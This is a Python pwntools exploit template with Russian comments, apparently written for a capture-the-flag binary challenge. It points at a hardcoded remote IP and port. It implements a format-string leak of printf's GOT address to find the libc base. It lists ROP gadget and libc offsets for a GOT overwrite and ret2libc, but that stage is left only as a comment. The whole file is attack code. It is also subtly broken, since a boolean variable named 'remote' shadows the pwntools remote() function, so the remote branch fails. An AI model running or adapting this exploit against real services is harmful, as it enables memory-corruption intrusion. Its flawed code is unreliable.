#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
pwn_fmtstr_rop.py — шаблон: fmtstr leak + GOT overwrite + ret2libc.
Адаптация: подставить адреса GOT, офсет форматной строки, адрес vuln/ret.
Запуск: ~/ctfenv/bin/python pwn_fmtstr_rop.py [remote]
"""
from pwn import *
import sys

BIN = './chall'
HOST, PORT = '62.173.140.174', 27920
# --- адреса (заполнить из objdump/readelf) ---
GOT_PRINTF = 0x404018   # пример; реально из бинарника
GOT_PUTS   = 0x404030
VULN       = 0x4011d6   # адрес vuln() для ret2vuln
RET        = 0x401235    # ret-гаджет (выравнивание стека)
POP_RDI_RET = 0x4012a3  # из ROPgadget
SYSTEM_OFF = 0x50d60    # для glibc 2.35 (уточнить по libc)
BIN_SH_OFF = 0x1d8698
PRINTF_OFF = 0x60680

FMT_OFFSET = 6          # позиция буфера в стеке printf

def leak(io):
    # один байт адреса за раз: %12$s|%13$s|...
    fmt = b'%12$s|%13$s|%14$s|%15$s|%16$s|%17$s|'
    payload = fmt + p64(GOT_PRINTF) + p64(GOT_PRINTF+1) + p64(GOT_PRINTF+2) \
              + p64(GOT_PRINTF+3) + p64(GOT_PRINTF+4) + p64(GOT_PRINTF+5)
    io.sendline(payload)
    data = io.recvuntil(b'|', timeout=3)
    parts = data.split(b'|')[:6]
    addr = b''
    for seg in parts:
        if seg:
            addr += seg[:1]
        else:
            addr += b'\x00'
    return u64(addr.ljust(8, b'\x00'))

def main():
    remote = len(sys.argv) > 1 and sys.argv[1] == 'remote'
    ctx.log_level = 'info'
    io = remote(HOST, PORT) if remote else process(BIN)
    io.recvuntil(b':' if remote else b'')
    libc_base = leak(io) - PRINTF_OFF
    log.info('libc base = 0x%x' % libc_base)
    io.close()
    # далее: перезапись GOT[printf] = system (fmtstr_payload) + ret2vuln
    # ... адаптировать под конкретное меню/вызовы

if __name__ == '__main__':
    main()
